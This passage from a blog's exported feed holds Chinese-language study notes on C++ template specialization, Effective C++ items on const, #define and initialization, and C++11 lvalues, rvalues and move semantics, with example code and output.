class="type">float</span>&gt;</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Entity</span>(<span class="type">float</span> a, <span class="type">float</span> b)</span><br><span class="line">    &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Full Specialization&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;&lt;float,float&gt;:    &quot;</span> &lt;&lt; a &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; b &lt;&lt; std::endl &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;<span class="comment">//偏特化</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Entity</span>&lt;T, <span class="type">int</span>&gt;</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Entity</span>(T a, <span class="type">int</span> b)</span><br><span class="line">    &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Partial Specialization&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;&lt;&quot;</span> &lt;&lt; <span class="built_in">typeid</span>(T).<span class="built_in">name</span>() &lt;&lt; <span class="string">&quot;,&quot;</span> &lt;&lt; <span class="string">&quot;int&quot;</span> &lt;&lt; <span class="string">&quot;&gt;: &quot;</span> &lt;&lt; a &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; b &lt;&lt; std::endl &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Entity</span>&lt;<span class="type">int</span>,<span class="type">int</span>&gt;(<span class="number">1</span>, <span class="number">3</span>);</span><br><span class="line">    <span class="built_in">Entity</span>&lt;<span class="type">float</span>,<span class="type">float</span>&gt;(<span class="number">1</span>, <span class="number">3</span>);</span><br><span class="line">    <span class="built_in">Entity</span>&lt;<span class="type">double</span>,<span class="type">double</span>&gt;(<span class="number">1</span>, <span class="number">3</span>);</span><br><span class="line">    <span class="built_in">Entity</span>&lt;<span class="type">double</span>, <span class="type">int</span>&gt;(<span class="number">1</span>, <span class="number">3</span>);</span><br><span class="line">    <span class="built_in">Entity</span>&lt;<span class="type">int</span>, <span class="type">double</span>&gt;(<span class="number">1</span>, <span class="number">3</span>);</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line">Partial Specialization</span><br><span class="line">&lt;<span class="type">int</span>,<span class="type">int</span>&gt;: <span class="number">1</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line">Full Specialization</span><br><span class="line">&lt;<span class="type">float</span>,<span class="type">float</span>&gt;:    <span class="number">1</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line">Primary Template</span><br><span class="line">&lt;<span class="type">double</span>,<span class="type">double</span>&gt;: <span class="number">1</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line">Partial Specialization</span><br><span class="line">&lt;<span class="type">double</span>,<span class="type">int</span>&gt;: <span class="number">1</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line">Primary Template</span><br><span class="line">&lt;<span class="type">int</span>,<span class="type">double</span>&gt;: <span class="number">1</span> <span class="number">3</span></span><br></pre></td></tr></table></figure><h3 id="函数特化"><a href="#函数特化" class="headerlink" title="函数特化"></a>函数特化</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Print</span><span class="params">(T x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;普通模板: &quot;</span>&lt;&lt; <span class="built_in">typeid</span>(T).<span class="built_in">name</span>() &lt;&lt; x &lt;&lt; std::endl;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;&gt;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Print</span><span class="params">(<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;函数模板特化:int&quot;</span> &lt;&lt; x &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span>&lt;&gt;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Print</span><span class="params">(<span class="type">float</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;函数模板特化:float&quot;</span> &lt;&lt; x &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">Print</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">Print</span>(<span class="number">1.0f</span>);</span><br><span class="line">    <span class="built_in">Print</span>(<span class="number">1.0L</span>);</span><br><span class="line">    <span class="built_in">Print</span>(<span class="string">&quot;123&quot;</span>);</span><br><span class="line">    std::string a = <span class="string">&quot;123&quot;</span>;</span><br><span class="line">    <span class="built_in">Print</span>(a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//函数模板特化:int1</span></span><br><span class="line"><span class="comment">//函数模板特化 : float1</span></span><br><span class="line"><span class="comment">//普通模板 : long double1</span></span><br><span class="line"><span class="comment">//普通模板 : char const* __ptr64123</span></span><br><span class="line"><span class="comment">//普通模板 : class std::basic_string &lt; char, struct std::char_traits&lt;char&gt;, class std::allocator&lt;char&gt; &gt;123</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>模板函数特化是针对模板函数的特定类型提供特殊实现，而函数重载是根据参数列表的不同提供多个同名函数。</li></ul><p>//TODO</p>]]></content>
      
      
      <categories>
          
          <category> cpp </category>
          
          <category> cherno </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
            <tag> cherno </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EffectiveCpp0x1</title>
      <link href="/2024/04/01/C&amp;C++/Effective%20Cpp0x1/"/>
      <url>/2024/04/01/C&amp;C++/Effective%20Cpp0x1/</url>
      
        <content type="html"><![CDATA[<h1 id="Effective-C"><a href="#Effective-C" class="headerlink" title="Effective C++"></a>Effective C++</h1><p>[toc]</p><h2 id="导读"><a href="#导读" class="headerlink" title="导读"></a>导读</h2><ul><li><strong>声明式</strong>：告诉编译器某个东西的<code>名称</code>和<code>类型</code>，但是略去细节。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">templete&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Randolfluo</span>;</span><br><span class="line"><span class="function">std::string <span class="title">Print</span><span class="params">(std::string string)</span></span>;</span><br></pre></td></tr></table></figure><ul><li><p><strong>定义式</strong>：提供编译器对象、函数和模板等的实际代码本体。</p></li><li><p><strong>初始化</strong>：给予对象值的过程。</p></li><li><p><strong>copy构造</strong>与<strong>copy赋值</strong>:通过是否有新对象被定义区分。</p></li></ul><h2 id="Accustoming-youself-to-C"><a href="#Accustoming-youself-to-C" class="headerlink" title="Accustoming youself to C++"></a>Accustoming youself to C++</h2><h3 id="01-View-C-as-a-federation-of-languages"><a href="#01-View-C-as-a-federation-of-languages" class="headerlink" title="01. View C++ as a federation of languages"></a>01. View C++ as a federation of languages</h3><p>C++是一个多重范式语言:</p><ul><li><strong>过程形式(procedural)</strong>：通过函数调用和控制流语句(如if语句和循环)来实现。</li><li><strong>面向对象形式(object-oriented)</strong>：支持封装、继承和多态等面向对象的特性。</li><li><strong>函数形式(functional)</strong>：</li><li><strong>泛型形式(generic)</strong>：C++通过模板支持泛型编程。模板允许你编写可以处理各种数据类型的通用代码。标准模板库（STL）中的容器和算法都是泛型的，可以与各种数据类型一起使用。</li><li><strong>元编程形式(metaprogramming)</strong>：C++提供了元编程的功能，其中最常见的是模板元编程。通过模板元编程，你可以在编译时生成代码，实现诸如计算、类型推导、代码生成等功能。</li></ul><h3 id="02-Prefer-consts-enums-and-inlines-to-define"><a href="#02-Prefer-consts-enums-and-inlines-to-define" class="headerlink" title="02. Prefer consts,enums,and inlines to #define"></a>02. Prefer consts,enums,and inlines to #define</h3><h4 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h4><ul><li><p>由于<code>预处理符号#</code>会在函数编译前进行复制和替换，如果发生错误，我们得到的信息将是<code>1234</code>而不是<code>Randolfluo</code>，于是你将为追踪他而浪费时间。</p></li><li><p>正确的方法是以常量替换宏。</p></li><li><p><code>#define</code>不注重作用域，因此不具封装性。</p></li></ul><h3 id=""><a href="#" class="headerlink" title=" "></a> </h3>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> Randolfluo =1234</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> Randolfluo = <span class="number">1234</span></span><br></pre></td></tr></table></figure><ul><li>宏看起来像函数，但是不会招致函数调用(function call)带来的额外开销。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Macro_Print(a,b) std::cout &lt;&lt; (a) + (b) &lt;&lt; std::endl;<span class="comment">//错误方式，相较于函数调用效率更高，但是调用时可能产生错误输出。</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">Inline_Print</span><span class="params">(<span class="type">const</span> T&amp; a, <span class="type">const</span> T&amp; b)</span><span class="comment">//正确方式，性能相同，但是具有类型安全，pass by reference-to-const</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">std::cout &lt;&lt; a + b &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> a = <span class="number">0</span>, b = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Macro_Print</span>(a, b);</span><br><span class="line"><span class="built_in">Inline_Print</span>(a, b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="类专属常量"><a href="#类专属常量" class="headerlink" title="类专属常量"></a>类专属常量</h4><ul><li>静态成员变量的定义通常需要在类外部进行，以便为其分配存储空间。这是因为在类声明中只是声明了静态成员变量的存在，而没有分配内存。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">static</span> <span class="type">const</span> <span class="type">int</span> MY_CONSTANT = <span class="number">10</span>; <span class="comment">// 类专属常量声明</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 类专属常量定义和初始化</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MyClass::MY_CONSTANT;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;My class constant: &quot;</span> &lt;&lt; MyClass::MY_CONSTANT &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="请记住"><a href="#请记住" class="headerlink" title="请记住"></a>请记住</h4><ul><li>对于单纯常量，最好以const对象或enums替换#define。</li><li>对于形似函数的宏（macros），最好改用inline函数替换#defines。</li></ul><h3 id="03-Use-const-whenever-possible"><a href="#03-Use-const-whenever-possible" class="headerlink" title="03. Use const whenever possible"></a>03. Use const whenever possible</h3><ul><li>令函数返回一个常量值，往往可以降低因错误而造成的意外。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Num</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> num;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">const</span> Num <span class="keyword">operator</span>+ (<span class="type">const</span> Num&amp; other) <span class="type">const</span></span><br><span class="line">    &#123;</span><br><span class="line">        Num result;</span><br><span class="line">        result.num = num + other.num;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Num a, b, c;</span><br><span class="line">    c = a + b;</span><br><span class="line">    <span class="keyword">if</span>( a + b = c )<span class="comment">//少写一个=号,如果不加入const，则此操作编译器将不报错</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="const成员函数"><a href="#const成员函数" class="headerlink" title="const成员函数"></a>const成员函数</h4><ul><li>将const实施于成员函数的目的，是为了确认该成员函数可作用于const对象。</li><li>通过pass by reference-to-const 传递对象，提高程序效率。</li></ul><h4 id="bitwise-constness-amp-logical-constness"><a href="#bitwise-constness-amp-logical-constness" class="headerlink" title="bitwise constness &amp; logical constness"></a>bitwise constness &amp; logical constness</h4><ul><li>请看书</li></ul><h4 id="请记住-1"><a href="#请记住-1" class="headerlink" title="请记住"></a>请记住</h4><ul><li>将某些东西声明为const可帮助编译器侦测出错误用法。const可被施加于任何作用域内的对象、函数参数、函数返回类型、成员函数本体。</li><li>编译器强制实施bitwise constness,但你编写程序时应该使用“概念上的常量性”( conceptual constness)。</li><li>当const和non-const成员函数有着实质等价的实现时，令non-const版本调用const版本可避免代码重复。</li></ul><h3 id="04-Make-sure-that-objects-are-initialized-before-ther’re-used"><a href="#04-Make-sure-that-objects-are-initialized-before-ther’re-used" class="headerlink" title="04. Make sure that objects are initialized before ther’re used."></a>04. Make sure that objects are initialized before ther’re used.</h3><ul><li>永远在使用对象前先将它初始化。</li></ul><h4 id="member-intialization-list"><a href="#member-intialization-list" class="headerlink" title="member intialization list"></a>member intialization list</h4><ul><li>如果成员变量是<code>const</code>或<code>reference</code>，就要赋初值,使用<code>成员初始化列表</code>。</li><li>类成员的初始化顺序不是按照初始化列表的顺序来的，而是按照类成员的声明顺序。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Entity</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Entity</span>()</span><br><span class="line">        :<span class="built_in">x</span>(<span class="number">12</span>)<span class="comment">//member intialization list</span></span><br><span class="line">    &#123;</span><br><span class="line">        std::cout &lt;&lt; x &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> x = <span class="number">10</span>;<span class="comment">//default member intializer</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Entity e;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//output 12</span></span><br></pre></td></tr></table></figure><h4 id="local-static-amp-non-local-static"><a href="#local-static-amp-non-local-static" class="headerlink" title="local static &amp;  non-local static"></a>local static &amp;  non-local static</h4><ul><li><code>local static</code>对象即函数内部的 static 变量，适用于需要在函数调用间保持状态的情况，可以防止变量的多次初始化，且仅在声明的函数内部可见。</li></ul><ul><li><p><code>non-local static</code>即函数外部的 static 变量，适用于在文件内部共享状态的情况，可以防止变量被其他文件访问，且仅在声明的文件内部可见。</p></li><li><p><code>Singleton</code>模式：将每个<code>non-local static</code>对象搬到自己的专属函数内(该对象在此函数内被声明为<code>static</code>[即<code>local static</code>对象])。这些函数返回一个reference 指向它所含的对象。然后用户调用这些函数，而不直接指涉这些对象。换句话说，non-local static 对象被local static 对象替换了。</p></li></ul><p>//TODO为什么默认构造函数比有初值的构造函数效率低</p><h4 id="请记住-2"><a href="#请记住-2" class="headerlink" title="请记住"></a>请记住</h4><ul><li>为内置型对象进行手工初始化，因为C++不保证初始化它们。</li><li>构造函数最好使用成员初值列( member initialization list)，而不要在构造函数本体内使用赋值操作(asignment)。初值列列出的成员变量，其排列次序应该和它们在class中的声明次序相同。</li><li>为免除“跨编译单元之初始化次序”问题，请以local static 对象替换non-local static对象。</li></ul>]]></content>
      
      
      <categories>
          
          <category> cpp </category>
          
          <category> effective cpp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
            <tag> effective cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cpp新特性</title>
      <link href="/2024/03/28/C&amp;C++/Cpp%E6%96%B0%E7%89%B9%E6%80%A7/"/>
      <url>/2024/03/28/C&amp;C++/Cpp%E6%96%B0%E7%89%B9%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h3 id="lvalue-amp-amp-rvalue-（C-11）"><a href="#lvalue-amp-amp-rvalue-（C-11）" class="headerlink" title="lvalue &amp;&amp; rvalue     （C++11）"></a>lvalue &amp;&amp; rvalue     （C++11）</h3><p><a href="https://eli.thegreenplace.net/2011/12/15/understanding-lvalues-and-rvalues-in-c-and-c">Understanding lvalues and rvalues in C and C++ - Eli Bendersky’s website (thegreenplace.net)</a></p><ul><li>An <code>lvalue</code> (<em>locator value</em>) represents an object that occupies some identifiable location in memory (i.e. has an address).</li><li><code>rvalues</code> are defined by exclusion, by saying that every expression is either an <em>lvalue</em> or an <em>rvalue</em>. Therefore, from the above definition of <em>lvalue</em>, an <em>rvalue</em> is an expression that <em>does not</em> represent an object occupying some identifiable location in memory.</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PrintName</span><span class="params">(<span class="type">const</span> std::string&amp; name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;[lvalue]&quot;</span> &lt;&lt; name &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PrintName</span><span class="params">(<span class="type">const</span> std::string&amp;&amp; name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;[rvalue]&quot;</span> &lt;&lt; name &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">std::string firstname = <span class="string">&quot;Randolf&quot;</span>;</span><br><span class="line">std::string secondname = <span class="string">&quot;luo&quot;</span>;</span><br><span class="line"><span class="built_in">PrintName</span>(firstname + secondname);</span><br><span class="line"><span class="built_in">PrintName</span>(firstname);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//[rvalue]Randolfluo</span></span><br><span class="line"><span class="comment">//[lvalue]Randolf</span></span><br></pre></td></tr></table></figure><h3 id="move-semantic"><a href="#move-semantic" class="headerlink" title="move semantic"></a>move semantic</h3><p>vb c   </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">String</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">String</span>() = <span class="keyword">default</span>; <span class="comment">// Default constructor</span></span><br><span class="line">    <span class="comment">// Constructor accepting string literal</span></span><br><span class="line">    <span class="built_in">String</span>(<span class="type">const</span> <span class="type">char</span>* string) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Created!\n&quot;</span>);</span><br><span class="line">        m_Size = <span class="built_in">strlen</span>(string);</span><br><span class="line">        m_Data = <span class="keyword">new</span> <span class="type">char</span>[m_Size];</span><br><span class="line">        <span class="built_in">memcpy</span>(m_Data, string, m_Size);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Copy constructor to perform deep copy</span></span><br><span class="line">    <span class="built_in">String</span>(<span class="type">const</span> String&amp; other) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Copied!\n&quot;</span>);</span><br><span class="line">        m_Size = other.m_Size;</span><br><span class="line">        m_Data = <span class="keyword">new</span> <span class="type">char</span>[m_Size];</span><br><span class="line">        <span class="built_in">memcpy</span>(m_Data, other.m_Data, m_Size);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Move constructor to perform shallow copy</span></span><br><span class="line">    <span class="built_in">String</span>(String&amp;&amp; other) <span class="keyword">noexcept</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Moved!\n&quot;</span>);</span><br><span class="line">        m_Size = other.m_Size;</span><br><span class="line">        m_Data = other.m_Data;</span><br><span class="line"></span><br><span class="line">        other.m_Size = <span class="number">0</span>;</span><br><span class="line">        other.m_Data = <span class="literal">nullptr</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Move assignment operator</span></span><br><span class="line">    String&amp; <span class="keyword">operator</span>=(String&amp;&amp; other) <span class="keyword">noexcept</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Moved!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span> != &amp;other) &#123;</span><br><span class="line">            <span class="keyword">delete</span>[] m_Data;</span><br><span class="line">            m_Size = other.m_Size;</span><br><span class="line">            m_Data = other.m_Data;</span><br><span class="line"></span><br><span class="line">            other.m_Size = <span class="number">0</span>;</span><br><span class="line">            other.m_Data = <span class="literal">nullptr</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Destructor to 